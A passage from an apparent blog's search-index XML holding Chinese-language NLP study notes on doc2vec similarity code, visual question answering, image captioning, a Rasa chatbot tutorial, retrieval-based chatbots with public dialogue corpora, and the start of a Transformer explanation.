class="hljs-string">'./data/zhwiki-latest-pages-articles.xml.bz2'</span><br>    wiki = WikiCorpus(zhwiki_name, lemmatize=<span class="hljs-literal">False</span>, dictionary=&#123;&#125;)<br>    documents = TaggedWikiDocument(wiki)<br><br>    model = g.Doc2Vec(documents, dm=<span class="hljs-number">0</span>, dbow_words=<span class="hljs-number">1</span>, size=docvec_size, window=<span class="hljs-number">8</span>, min_count=<span class="hljs-number">19</span>, iter=<span class="hljs-number">5</span>, workers=<span class="hljs-number">8</span>)<br>    model.save(<span class="hljs-string">'data/zhiwiki_news.doc2vec'</span>)<br></code></pre></div></td></tr></table></figure><p>模型的推断。根据输入文档，在docmatrix的中infer出最后结果，要指定infer_epoch。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gensim.models <span class="hljs-keyword">as</span> g<br><span class="hljs-keyword">import</span> codecs<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">SimlarityCalu</span><span class="hljs-params">(Vector1,Vector2)</span>:</span><br>    Vector1Mod=np.sqrt(Vector1.dot(Vector1))<br>    Vector2Mod=np.sqrt(Vector2.dot(Vector2))<br>    <span class="hljs-keyword">if</span> Vector2Mod!=<span class="hljs-number">0</span> <span class="hljs-keyword">and</span> Vector1Mod!=<span class="hljs-number">0</span>:<br>        simlarity=(Vector1.dot(Vector2))/(Vector1Mod*Vector2Mod)<br>    <span class="hljs-keyword">else</span>:<br>        simlarity=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">return</span> simlarity<br><br><span class="hljs-comment">#parameters</span><br>model=<span class="hljs-string">'toy_data/model.bin'</span><br>test_docs=<span class="hljs-string">'toy_data/t_docs.txt'</span><br>output_file=<span class="hljs-string">'toy_data/test_vectors.txt'</span><br><br><span class="hljs-comment">#inference hyper-parameters</span><br>start_alpha=<span class="hljs-number">0.01</span><br>infer_epoch=<span class="hljs-number">1000</span><br><br><span class="hljs-comment">#load model</span><br>m = g.Doc2Vec.load(model)<br>test_docs = [x.strip().split() <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> codecs.open(test_docs, <span class="hljs-string">'r'</span>, <span class="hljs-string">'utf-8'</span>).readlines()]<br><br><span class="hljs-comment">#infer test vectors</span><br>output = open(output_file, <span class="hljs-string">'w'</span>)<br>a=[]<br><br><span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> test_docs:<br>    output.write(<span class="hljs-string">' '</span>.join([str(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> m.infer_vector(d, alpha=start_alpha, steps=infer_epoch)]) + <span class="hljs-string">'\n'</span> )<br>    a.append(m.infer_vector(d, alpha=start_alpha, steps=infer_epoch))<br>output.flush()<br>output.close()<br>print(SimlarityCalu(a[<span class="hljs-number">0</span>],a[<span class="hljs-number">1</span>]))<br></code></pre></div></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> NLP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> text similarity </tag>
            
            <tag> word2vec </tag>
            
            <tag> doc2vec </tag>
            
            <tag> SimHash </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vision to text</title>
      <link href="/posts/88e9ab16.html"/>
      <url>/posts/88e9ab16.html</url>
      
        <content type="html"><![CDATA[<p>视觉问答任务的定义是对于一张图片和一个跟这幅图片相关的问题，机器需要根据图片信息对问题进行回答。</p><ul><li>输入：一张图片和一个关于图片信息的问题，常见的问题形式有选择题，判断题</li><li>输出：挑选出正确答案</li></ul><p>​视觉问答任务本质上是一个多模态的研究问题。这个任务需要我们结合自然语言处理（NLP）和计算机视觉（CV)的技术来进行回答。</p><ul><li>自然语言处理（NLP）<ul><li>举一个在NLP领域常见的基于文本的Q&amp;A问题：how many bridges arethere in Paris?</li><li>一个NLP Q&amp;A系统需要首先识别出这是一个什么类型的问题，比如这里是一个“how many”关于计数的问题，所以答案应该是一个数字。之后系统需要提取出哪个物体（object）需要机器去计数，比如这里是“bridges“。最后需要我们提取出问题中的背景（context），比如这个问题计数的限定范围是在巴黎这个城市。</li><li>当一个Q&amp;A系统分析完问题，系统需要根据知识库（knowledgebase）去得到答案。</li></ul></li><li>机器视觉（CV)<ul><li>VQA区别于传统的textQA在于搜索答案和推理部分都是基于图片的内容。所以系统需要进行目标检测（objectdetection），再进行分类（classification），之后系统需要对图片中物体之间的关系进行推理。</li></ul></li></ul><h2><span id="vqa-notes">VQA Notes</span></h2><h3><span id="基于图像信息和文本信息匹配的vqa">基于图像信息和文本信息匹配的VQA</span></h3><p>通常，一个VQA系统包含了以下三个步骤：</p><ol type="1"><li>抽取问题特征</li><li>抽取图片特征</li><li>结合图片和问题特征去生成答案</li></ol><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/VQA.assets/image-20200228220029800.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/VQA.assets/image-20200228220726450.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><h3><span id="基于注意力attention的vqa">基于注意力（attention）的VQA</span></h3><p>​ VQA方案是使用位置注意力（spatialattention）去生成关于区域（region）的位置特征，并训练一个CNN网络。一般有两种方法去获得一张图片关于方位的区域。</p><ol type="1"><li>划分成网格状（grid），并根据问题与图片特征去预测每一个网格的attentionweight，将图片的CNN的feature通过加权求和的方式得到attention weightedfeature，再通过attention weighted feature发现相对比较重要的区域</li></ol><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/VQA.assets/image-20200228220844530.png" srcset="/img/loading.gif" lazyload alt="image" style="zoom:80%;"></p><ol start="2" type="1"><li>目标识别的方式生成很多bounding box。</li></ol><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/VQA.assets/image-20200228220942528.png" srcset="/img/loading.gif" lazyload alt="image" style="zoom:80%;"></p><p>根据生成的区域（region），使用问题去找到最相关的区域，并利用这些区域去生成答案。</p><h3><span id="stacked-attention">Stacked Attention</span></h3><p>Stacked Attention，多次重复question-image attention。</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/VQA.assets/image-20200228221149468.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><ul><li>图片使用CNN 编码 <span class="math display">\[\phi =CNN(I)\]</span></li><li>问题使用LSTM编码 <span class="math display">\[s=LSTM(E_q)\]</span></li><li>Stacked Attention <span class="math display">\[\alpha_{c,l} \propto\exp F_c(s, \phi_l) ,~~  \sum_{l=1}^L \alpha_{c,l}=1, ~~ x_c = \sum_l\alpha_{c,l}\phi_l\]</span></li><li>classifier, 其中G=[G_1, G_2, ..., G_M]是两层的全连接层 <span class="math display">\[P(a_i|I,q) \propto \exp G_i(x,s),~~ x=[x_1,x2,...,x_C]\]</span></li></ul><h2><span id="image-captioning">Image captioning</span></h2><h3><span id="基本模型">基本模型</span></h3><p>​ 常见的image captioning系统是由一个CNN+RNN的编码解码模型完成。类比一下machinetranslation系统，通常由一个RNN encoder + RNN decoder组成。</p><h4><span id="图像编码">图像编码</span></h4><p>​ Vinyals et al. (2014) Show and Tell: A Neural Image CaptionGenerator 这篇文章将seq2seq模型中的LSTM encoder换成CNNencoder，用于提取图片的信息，得到一个固定长度的内容向量（contextvector），之后通过一个RNN decoder，将信息使用文字的方式解码出来。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/Image_Captioning.assets/image-20200228213101616.png" srcset="/img/loading.gif" lazyload alt="image" style="zoom:50%;"></p><p>​ 结合注意力机制 - Kelvin et al. (2014) Show, Attend and Tell: NeuralImage Caption Generation with Visual Attention</p><blockquote><ul><li>类比人看图说话：当人在解说一幅图片的时候，每预测一个字，会关注到图片上的不同位置。</li><li>在解码器预测文字的时候，会关注到跟当前文字内容和图片最相关的位置。</li></ul></blockquote><h5><span id="注意力机制">注意力机制</span></h5><ol type="1"><li>一张图片的卷积层中的向量有14x14=196个feature maps <span class="math inline">\(a_i, i=1...196\)</span>，每个featuremap对应于每个图片中不同的高亮位置。</li><li>注意力机制通过计算每个feature map与当前的hiddenstate计算两者之间的相关度，这里的hidden state <span class="math inline">\(h_{t-1}\)</span>总结了已经生成的1到t-1个单词的内容。 <span class="math display">\[e_{ti}=f_{att}(a_i, h_{t-1}) \\ \alpha_{ti} ={\exp(e_{ti}) \over \sum_{k=1}^L \exp(e_{tk}) }\]</span></li><li>之后通过加权求和得到注意力内容向量 <span class="math inline">\(\hat{z}_t\)</span>。 <span class="math display">\[\hat{z}_t=\phi(\{a_i\},\{\alpha_i\})\]</span></li><li>通过将196个feature maps求平均值去初始化LSTM中的 memory cell <span class="math inline">\(c_0, h_0\)</span></li><li>根据图片及已经生成的部分单词，去预测下一个单词 <span class="math display">\[c_0 = f_{init,c}({1\over L} \sum_i^L a_i) \\ h_0= f_{init,h}({1\over L} \sum_i^L a_i) \\  p(y_t|a, y_1^{t-1}) \propto\exp(L_o (E y_{t-1} + L_h h_t + L_z \hat{z}_t))\]</span></li></ol><p><a href="https://github.com/RacleRay/Have_Fun/tree/master/image_caption">showattention and tell</a></p><h5><span id="beam-search-优化">beam search 优化</span></h5><p>​每次预测下一个单词的时候，计算当前所有路径的log-likelihood并进行排序,只保留log-likelihood 最大值的K个beams。</p><h4><span id="目标识别">目标识别</span></h4><p>​ Fang et al 2014， From Captions to Visual Concepts and Back,提供了另一个image caption系统的思路。</p><ol type="1"><li>预测文字： 使用一个CNN去做目标识别，并且根据boundingbox生成可能出现的文字</li><li>生成句子：通过一个统计语言模型，生成很多个可能的句子集合</li><li>重新排序已经生成的句子： 通过学习一个Deep Multimodal SimilarityModel（DMSM）去重新排序所有可能的句子集合，取最高分数的句子作为系统输出。</li></ol><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/Image_Captioning.assets/image-20200228213216469.png" srcset="/img/loading.gif" lazyload alt="image" style="zoom:67%;"></p><h3><span id="评估指标">评估指标</span></h3><p>常见的image captioning 系统的评估指标使用的是</p><ul><li>BLEU，是常见的机器翻译系统的评估指标，计算的是一句预测的文字与人类标注的参考文字之间的n-gram重合度（overlap）。</li><li>METEOR，也是常见的机器翻译系统的评估指标，其通过建立一个短语词表（phrasetable），考虑了输出文本是否使用了相似短语。</li><li>CIDEr， 考虑了句子中的文字与图片的相关性</li><li>ROUGE-L，是text summarization的评估指标</li><li>SPICE 是专门设计出来用于 image caption 问题的。全称是 SemanticPropositional Image Caption Evaluation。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> NLP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> visual text </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Rasa Notes</title>
      <link href="/posts/1b390165.html"/>
      <url>/posts/1b390165.html</url>
      
        <content type="html"><![CDATA[<h3><span id="rasa_nlu训练数据的生成">rasa_nlu训练数据的生成</span></h3><p>对话系统的冷启动都会遇到这样的问题，没有数据。</p><p>使用chatito来生成rasa_nlu意图识别需要的数据。这个数据需要反反复复的修改和完善。</p><p><a href="https://github.com/rodrigopivi/Chatito" target="_blank" rel="noopener">Chatito</a> <a href="https://github.com/rodrigopivi/Chatito/blob/master/spec.md">doc</a></p><p>在产生训练数据的时候需要确定的nlu的意图和实体类别，需要在domain.yml文件中配置intents和entities。</p><h3><span id="官方doc">官方DOC</span></h3><p>https://rasa.com/docs/rasa/core/policies/</p><h3><span id="mini-rasa-tutorial">mini rasa tutorial</span></h3><blockquote><ol type="1"><li>创建一个新的项目</li><li>查看NLU培训数据</li><li>定义模型配置，写下第一个故事Story</li><li>定义这个故事story的作用域domain</li><li>训练模型</li><li>测试你写好的助手</li></ol></blockquote><h4><span id="创建新项目">创建新项目</span></h4><p>路径指向一个新的空文件夹 <code>cd path/to/a/blank/folder</code></p><p>在这个文件夹里面创建新的rasa项目<code>rasa init --no-prompt</code></p><p>文件夹中将会生成以下的文件：</p><table><thead><tr class="header"><th><strong>init</strong>.py</th><th>空文件用于定位</th></tr></thead><tbody><tr class="odd"><td>actions.py</td><td>用于定义动作（自定义脚本代码）</td></tr><tr class="even"><td>config.yml</td><td>配置NLU和core模型</td></tr><tr class="odd"><td>credentials.yml</td><td>连接到其他服务器的细节（不常用）</td></tr><tr class="even"><td>data/nlu.md</td><td>自定义NLU训练数据</td></tr><tr class="odd"><td>data/stories.md</td><td>自定义stories</td></tr><tr class="even"><td>domain.yml</td><td>助手的定义域domian</td></tr><tr class="odd"><td>endpoints.yml</td><td>连接到fb message等的轨道（不常用）</td></tr><tr class="even"><td>models/<timestame>.tar.gz</timestame></td><td>模型及其参数文件</td></tr><tr class="odd"><td><self design module></self></td><td>自定义的NLU模型</td></tr></tbody></table><h4><span id="自定义nlu训练数据">自定义NLU训练数据</span></h4><figure class="highlight haskell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs haskell"><span class="hljs-title">cat</span> <span class="hljs-class"><span class="hljs-keyword">data</span>/nlu.md</span><br></code></pre></div></td></tr></table></figure><h4><span id="自定义stories">自定义stories</span></h4><p>查看写好的stories</p><figure class="highlight haskell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs haskell"><span class="hljs-title">cat</span> <span class="hljs-class"><span class="hljs-keyword">data</span>/stories.md</span><br></code></pre></div></td></tr></table></figure><h4><span id="自定义动作acitons"><strong>自定义动作acitons</strong></span></h4><p>actions有两种类型：</p><ul><li>直接回复，在domain.yml中定义templete</li><li>自定义操作，在aciton.py文件中添加</li></ul><h4><span id="自定义domain">自定义domain</span></h4><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">cat</span> <span class="hljs-selector-tag">domain</span><span class="hljs-selector-class">.yml</span><br></code></pre></div></td></tr></table></figure><ol type="1"><li>intents：用户意图</li><li>entities：实体</li><li>slots：槽</li><li>actions：助手说和做的事情</li><li>templates：助手根据actions具体要做的事情</li></ol><h4><span id="定义模型配置">定义模型配置</span></h4><p>配置文件<code>config.yml</code></p><ul><li>police: core，决定对话状态跟踪策略</li><li>pipeline: NLU，Natural Language Understanding and IntentClassification，理解当前用户输入，提取意图。</li></ul><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">language: <span class="hljs-string">"zh"</span><br><br>pipeline:<br>  - name: <span class="hljs-string">"JiebaTokenizer"</span><br><br>policies:<br>  - name: FallbackPolic<br>    fallback_action_name: <span class="hljs-string">'action_default_fallback'</span><br>    nlu_threshold: 0.5<br>    core_threshold: 0.3<br></code></pre></div></td></tr></table></figure><h4><span id="训练模型">训练模型</span></h4><p>使用data下面的训练数据</p><blockquote><p>-- core/ -- stories.md -- nlu/ -- nlu.json</p></blockquote><p>自动对模型进行训练，训练好的模型将会被打上时间戳timestamp作为新的模型，保存在models目录下面</p><p><code>rasa train</code></p><h4><span id="shell启动">SHELL启动</span></h4><p><code>rasa shell</code></p><h4><span id="可视化界面">可视化界面</span></h4><p><code>rasa x</code></p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> NLP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rasa </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ChatBot Simple Notes</title>
      <link href="/posts/fc0185e8.html"/>
      <url>/posts/fc0185e8.html</url>
      
        <content type="html"><![CDATA[<h3><span id="基于检索技术的模型-vs生成式模型">基于检索技术的模型 VS生成式模型</span></h3><p>​<strong>基于检索技术的模型</strong>较为简单，主要是根据用户的输入和上下文内容，使用了知识库（存储了事先定义好的回复内容）和一些启发式方法来得到一个合适的回复。启发式方法简单的有基于规则的表达式匹配，复杂的有一些机器学习里的分类器。这些系统不能够生成任何新的内容，只是从一个固定的数据集中找到合适的内容作为回复。</p><p>​ 对于基于检索技术的模型，回复的内容语法上较为通顺，较少出现语法错误，不能结合上下文给出回复。</p><p>​生成式模型典型的有<strong>基于机器翻译模型</strong>的，与传统机器翻译模型不同的是，生成式模型的任务不是将一句话翻译成其他语言的一句话，而是<strong>输出一个回答(response)</strong>。</p><p>​</p><h3><span id="短对话-vs-长对话">短对话 VS 长对话</span></h3><p>​处理长对话内容将更加困难，这是因为你需要在当前对话的情境下知道之前的对话说过什么。</p><h3><span id="开放域-vs-特定领域">开放域 VS 特定领域</span></h3><p>​面向开放域的聊天机器人技术面临更多困难，这是因为会话可能涉及的面太广，没有一个清晰的目标和意图。</p><p>​面向特定领域的相关技术则相对简单一些，这是因为特定领域给会话的主题进行了限制，目标和意图也更加清晰，典型的例子有客服系统助手和购物助手。</p><h3><span id="面临的挑战">面临的挑战</span></h3><h4><span id="如何结合上下文信息">如何结合上下文信息</span></h4><p>​聊天机器人系统通常需要利用一些上下文信息(Context)，这里的上下文信息包括了<strong>对话过程中的语言上下文信息</strong>和<strong>用户的身份信息</strong>等。在长对话中人们关注的是之前说了什么内容以及产生了什么内容的交换，这是语言上下文信息的典型。</p><h4><span id="语义一致性">语义一致性</span></h4><p>​机器人面对相同语义而不同形式的问题应该给予一致的回复，例如这两个问题[Howold are you?]和[What’s yourage?]，很有可能不是一个个体。最大的原因在于训练模型的数据来源于大量不同的用户，这导致机器人失去了固定统一的人格。</p><h4><span id="对话模型的评测">对话模型的评测</span></h4><p>​ 在开放域中的对话系统没有一个清晰的优化目标。用于机器翻译的评测指标<a href="https://en.wikipedia.org/wiki/BLEU">BLEU</a>不能适用于此，是因为它的计算基础是语言表面上的匹配程度，而对话中的回答可以是完全不同词型但语义通顺的语句。</p><h4><span id="意图和回复多样性">意图和回复多样性</span></h4><p>​生成式模型中的一个普遍问题是，它们可能生成一些通用的回答，例如[That’sgreat!]和[I don’t know]这样的可以应付许多的用户询问。</p><p>​另外，人们在对话过程中的回复与询问有一定特定关系，是有一定意图的，而许多面向开放域的机器人不具备特定的意图。</p><p>​目前深度学习的价值主要体现在能够获取大量数据的特定领域。目前一个无法做的事情是产生一个有意义的对话。</p><h3><span id="公开语料">公开语料</span></h3><ol type="1"><li><a href="https://github.com/rustch3n/dgk_lost_conv">dgk_shooter_min.conv.zip</a>中文电影对白语料，噪音比较大，许多对白问答关系没有对应好</li><li><a href="https://github.com/kite1988/nus-sms-corpus" target="_blank" rel="noopener">The NUS SMSCorpus</a> 包含中文和英文短信息语料，据说是世界最大公开的短消息语料</li><li><a href="https://github.com/gunthercox/chatterbot-corpus/tree/master/chatterbot_corpus/data">ChatterBot中文基本聊天语料</a>ChatterBot聊天引擎提供的一点基本中文聊天语料，量很少，但质量比较高</li><li><a href="https://github.com/karthikncode/nlp-datasets" target="_blank" rel="noopener">Datasets forNatural Language Processing</a>这是他人收集的自然语言处理相关数据集，主要包含QuestionAnswering，Dialogue Systems， Goal-Oriented DialogueSystems三部分，都是英文文本。可以使用机器翻译为中文，供中文对话使用</li><li><a href="https://github.com/rustch3n/dgk_lost_conv/tree/master/results">小黄鸡</a>据传这就是小黄鸡的语料：xiaohuangji50w_fenciA.conv.zip （已分词） 和xiaohuangji50w_nofenci.conv.zip （未分词）</li><li><a href="https://github.com/Samurais/egret-wenda-corpus">白鹭时代中文问答语料</a>由白鹭时代官方论坛问答板块10,000+问题中，选择被标注了“最佳答案”的纪录汇总而成。人工review rawdata，给每一个问题，一个可以接受的答案。目前，语料库只包含2907个问答。(<a href="http://localhost:8888/notebooks/9%20机器客服语音助手/2.generative_chatbot/egret-wenda-corpus.zip">备份</a>)</li><li><a href="https://github.com/Marsan-Ma/chat_corpus" target="_blank" rel="noopener">Chat corpusrepository</a> chat corpus collection from various open sources包括：开放字幕、英文电影字幕、中文歌词、英文推文</li><li><a href="https://github.com/Samurais/insuranceqa-corpus-zh">保险行业QA语料库</a>通过翻译 <a href="https://github.com/shuzi/insuranceQA">insuranceQA</a>产生的数据集。train_data含有问题12,889条，数据141779条，正例：负例 = 1:10； test_data含有问题2,000条，数据22000条，正例：负例 = 1:10；valid_data含有问题2,000条，数据22000条，正例：负例 = 1:10</li></ol><h3><span id="基于内容检索式的聊天机器人">基于内容检索式的聊天机器人</span></h3><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/chatbot简述.assets/image-20200228191924951.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>​ 检索式模型的输入是<strong>一段上下文内容 C(会话到目前未知的内容信息)</strong>和<strong>一个可能作为回复的候选答案</strong>；模型的输出是对这个候选答案的打分。寻找最合适的回复内容的过程是：先对一堆候选答案进行打分及排序，最后选出分值最高的那个最为回复。</p><p>​ Retrieval-Based Conversational Model inTensorflow：https://github.com/dennybritz/chatbot-retrieval/</p><p>​ 数据可以在GoogleDrive文件夹中找到：https://drive.google.com/open?id=1RIIbsS-vxR7Dlo2_v6FWHDFE7q1XPPgj</p><p>​ 数据文件需要:</p><figure class="highlight gcode"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gcode">- glove<span class="hljs-number">.6</span>B<span class="hljs-number">.50</span>d.txt <span class="hljs-comment">(Subfolder GloVe)</span><br>- trai<span class="hljs-symbol">ning_10000</span>.csv <span class="hljs-comment">(Subfolder MAIN FILES)</span><br>- validatio<span class="hljs-symbol">n_1000</span>.csv <span class="hljs-comment">(Subfolder MAIN FILES)</span><br>- testi<span class="hljs-symbol">ng_same_structure_1000</span>.csv <span class="hljs-comment">(Subfolder MAIN FILES)</span><br>- testi<span class="hljs-symbol">ng_different_structure_100</span>.csv <span class="hljs-comment">(Subfolder MAIN FILES)</span><br>- saved_model_<span class="hljs-number">10000</span>_gpu.pt <span class="hljs-comment">(Subfolder SAVED MODELS)</span><br></code></pre></div></td></tr></table></figure><p>​ 数据集为Ubuntu对话数据集。<a href="https://github.com/dennybritz/chatbot-retrieval">chatbot-retrieval</a>/<a href="https://github.com/dennybritz/chatbot-retrieval/tree/master/notebooks">notebooks</a>/DataExploration.ipynb文件为数据分析。</p><h4><span id="ubuntu对话数据集">Ubuntu对话数据集</span></h4><h5><span id="训练集">训练集</span></h5><p>​训练数据有1,000,000条实例，其中一半是正例（label为1），一半是负例（label为0，负例为随机生成）。</p><p>​每条实例包括一段上下文信息（context），即Query；和一段可能的回复内容，即Response；Label为1表示该Response确实是Query的回复，Label为0则表示不是。</p><p>​ 数据集的生成使用了<a href="http://www.nltk.org/">NLTK工具</a>，包括分词、stemmed、lemmatized等文本预处理步骤；同时还使用了NER技术，将文本中的实体，如姓名、地点、组织、URL等替换成特殊字符。这些文本预处理并不是必须的，但是能够提升一些模型的性能。</p><p>​ query的平均长度为86个word，而response的平均长度为17个word。</p><h5><span id="测试集和验证集">测试集和验证集</span></h5><p>​与训练集不同，在测试集和验证集中，对于每一条实例，有一个正例和九个负例数据（也称为干扰数据）。模型的目标在于给正例的得分尽可能的高，而给负例的得分尽可能的低。</p><p>​ 负例生成方法可以参考谷歌的Smart Reply则使用了<a href="http://arxiv.org/abs/1606.04870">聚类技术</a>，将每个类的中取一些作为负例，这样生成负例的方式显得更加合理（考虑了负例数据的多样性，同时减少时间开销）。</p><h5><span id="评测">评测</span></h5><p>​模型的评测<strong>recall@k</strong>，即经模型对候选的response排序后，前k个候选中存在正例数据（正确的那个）的占比；显然k值越大，该指标会越高。</p><h4><span id="dual-encoder-lstm-network">Dual Encoder LSTM Network</span></h4><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/chatbot简述.assets/image-20200228194327764.png" srcset="/img/loading.gif" lazyload alt="image" style="zoom:67%;"></p><p>大致的流程如下：</p><ol type="1"><li><p>Query和Response都是经过分词的，分词后每个词embedded为向量形式。初始的词向量使用<a href="http://nlp.stanford.edu/projects/glove/">GloVevectors</a>，之后词向量随着模型的训练会进行fine-tuned（实验发现，初始的词向量使用GloVe并没有在性能上带来显著的提升）。</p></li><li><p>Query和Response经过相同的RNN（word byword）。RNN最终生成一个向量表示，捕捉了Query和Response之间的[语义联系]（图中的c和r）；这个向量的维度是可以指定的，这里指定为256维。</p></li><li><p>将向量c与一个矩阵M相乘，来预测一个可能的回复r’。如果c为一个256维的向量，M维256*256的矩阵，两者相乘的结果为另一个256维的向量，相当于一个生成式的回复向量。矩阵M是需要训练的参数。</p></li><li><p>通过点乘的方式来预测生成的回复r’和候选的回复r之间的相似程度，点乘结果越大表示候选回复作为回复的可信度越高；之后通过sigmoid函数，转成概率形式。图中把第(3)步和第(4)步结合在一起了。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> NLP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> retireval </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Transformer Model</title>
      <link href="/posts/7c7eb002.html"/>
      <url>/posts/7c7eb002.html</url>
      
        <content type="html"><![CDATA[<h2><span id="1transformer模型">1.Transformer模型</span></h2><p>​序列计算中，传统的RNN在预测下一个符号（token）的时候，会对以往的历史信息有很强的依赖，使得难以充分地并行化，也无法很好地加深网络的层级结构。</p><p>​而对于传统的基于CNN的神经机器翻译模型，两个任意输入与输出位置的信号关联所需要的运算数量与它们的位置距离成正比，Facebook提出的CNNNMT 为线性增长。</p><p>​ <mark>这两种常见的结构使得学习较远位置的依赖关系（long-termdependency）非常困难</mark>。</p><p>​ 在 Transformer中，两个任意输入的信号关联的开销会减少到一个固定的运算数量级，使用Multi-Head Attention注意力机制可以完全脱离RNN及CNN的结构，使得Transformer可以高效地并行化，并堆叠多层的网络。</p><p>​自注意力（Self-attention），是一种涉及<mark>单序列不同位置的注意力机制</mark>，并能计算序列的表征。自注意力这种<mark>在序列内部执行Attention的方法可以视为搜索序列内部的隐藏关系</mark>，这种内部关系对于翻译以及序列任务的性能非常重要。</p><h3><span id="11-编码器-encoder">1.1 编码器 encoder</span></h3><ul><li><p>编码器encoder由6层结构一样的网络层组成，每一层有2个子层：</p><ul><li><p>第一个子层是multi-head self-attention Layer</p></li><li><p>第二个子层是一个<mark>基于位置编码的全连接网络层</mark>（position-wisefully connected feed-forward network）</p></li><li><p>会使用残差连接的方式，分别对每个子层的输入加到这个子层的输出上，然后再接一个Layernormalization的归一化层。</p><p>​ <span class="math display">\[ \text{LayerNorm}(x+\text{Sublayer}(x))\]</span></p></li><li><p>所有的embedding及hidden state的维度都是512</p></li></ul></li></ul><h3><span id="12-解码器-decoder">1.2 解码器 decoder</span></h3><ul><li><p>解码器decoder由6层结构一样的网络层组成，每一层除了跟encode人一样有2个子层以外，还有第3个子层</p><ul><li>第一个子层是multi-head self-attention Layer</li><li>第二个子层是一个基于位置编码的全连接网络层（position-wise fullyconnected feed-forward network）</li><li><font color="red">第三个子层用于对encoder的输出向量进行multi-headattention</font></li><li>同样的，会使用残差连接的方式，然后再接一个Layernormalization的归一化层。 <span class="math display">\[\text{LayerNorm}(x+\text{Sublayer}(x))\\ \]</span></li><li>decoder还需要将还没有生成的后续序列掩盖（masking），这样做是为了防止decoder在做self-attention的时候关注到后续还未生成的单词上去。</li></ul></li></ul><h3><span id="13-注意力机制">1.3 注意力机制</span></h3><ul><li>传统的注意力机制，也称为scaled Dot-ProductAttention，可以看成是有一个询问的词（query），去跟一堆哈希表中的键值对（key-valuepair）进行匹配，找到最相关的键（key），之后返回该键所对应的值（value）。通常的，如果只返回一个key所对应的value，称之为hardattention。如果对所有的key都计算一个相关系数，（也称之为attentionweight），可以将所有key对应的value进行加权求和（weightedsum）这样的操作称之为soft attention。 <span class="math display">\[\text{Attention}(Q,K,V) =\text{softmax}\left({QK^T \over \sqrt{d_k}}\right)V\]</span></li><li>其中所有的query和key都是维度为<span class="math inline">\(d_k\)</span>的向量，将这些向量分别叠在一起形成<span class="math inline">\(Q\in\mathbb{R}^{|Q|\times d_k},K\in\mathbb{R}^{|K|\times d_k}\)</span>的矩阵。</li><li>所有的value都是维度为<span class="math inline">\(d_v\)</span>的向量，将这些向量叠在一起形成<span class="math inline">\(V\in\mathbb{R}^{|V|\times 